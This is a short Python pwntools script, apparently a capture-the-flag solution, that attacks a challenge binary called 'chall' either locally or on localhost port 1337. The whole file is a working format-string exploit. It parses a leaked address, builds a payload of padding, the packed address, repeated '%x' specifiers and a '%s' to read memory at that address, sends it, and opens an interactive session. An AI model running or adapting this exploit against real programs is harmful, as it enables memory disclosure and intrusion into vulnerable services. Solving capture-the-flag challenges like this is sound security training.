from pwn import *

if args.REMOTE:
	r = remote("localhost",1337) 
else :
	r = process("chall")

padding = 2
offset = 6

address = p32(int(r.recvline().strip().split(b"0x")[1],16))
payload = b"A"*padding + address + b"%x"*offset + b"%s" 

r.recvuntil(": ")
r.sendline(payload)
r.interactive()